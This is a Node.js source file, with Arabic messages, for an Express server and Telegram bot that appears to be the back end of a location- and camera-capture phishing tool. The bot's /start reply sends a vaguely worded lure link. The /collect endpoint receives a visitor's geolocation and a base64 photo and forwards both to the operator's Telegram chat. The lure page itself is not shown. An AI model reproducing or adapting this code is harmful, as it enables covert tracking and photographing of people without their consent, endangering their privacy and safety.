require('dotenv').config();

const express = require('express');
const path = require('path');
const { Telegraf } = require('telegraf');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID   = process.env.CHAT_ID;
const PORT      = process.env.PORT || 3000;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('❌ يجب ضبط BOT_TOKEN و CHAT_ID في متغيرات البيئة');
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const app = express();

app.use(express.json({ limit: '15mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/collect', async (req, res) => {
  try {
    const { location, photo } = req.body;

    if (!location) {
      return res.status(400).json({ ok: false, error: 'الموقع مفقود' });
    }

    // 1) أرسل الموقع
    await bot.telegram.sendLocation(CHAT_ID, location.lat, location.lon);

    // 2) أرسل الصورة إن وُجدت، وإلا أرسل رسالة نصية
    if (photo) {
      const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');
      const buffer = Buffer.from(base64Data, 'base64');
      await bot.telegram.sendPhoto(CHAT_ID, { source: buffer }, {
        caption: `📍 ${location.lat.toFixed(5)}, ${location.lon.toFixed(5)}\n🎯 دقة: ${Math.round(location.acc)} م`
      });
    } else {
      await bot.telegram.sendMessage(CHAT_ID,
        `📍 الموقع فقط (بدون صورة):\n${location.lat.toFixed(5)}, ${location.lon.toFixed(5)}\n🎯 دقة: ${Math.round(location.acc)} م`
      );
    }

    res.json({ ok: true });
  } catch (err) {
    console.error('خطأ في /collect:', err);
    res.status(500).json({ ok: false });
  }
});

bot.start((ctx) => {
  const url = process.env.PUBLIC_URL || 'https://your-app.onrender.com';
  ctx.reply(
    `👋 أهلاً!\n\nاذهب الى التواصل. :\n` +
    `•\n` +
    `• \n\n` +
    `اذهب الى الصفحة الجديدة لتواصل معه\n\n` +
    `🔗 ${url}/index.html`
  );
});

bot.launch();
console.log('🤖 البوت يعمل...');

app.listen(PORT, () => {
  console.log(`🌐 السيرفر يعمل على المنفذ ${PORT}`);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));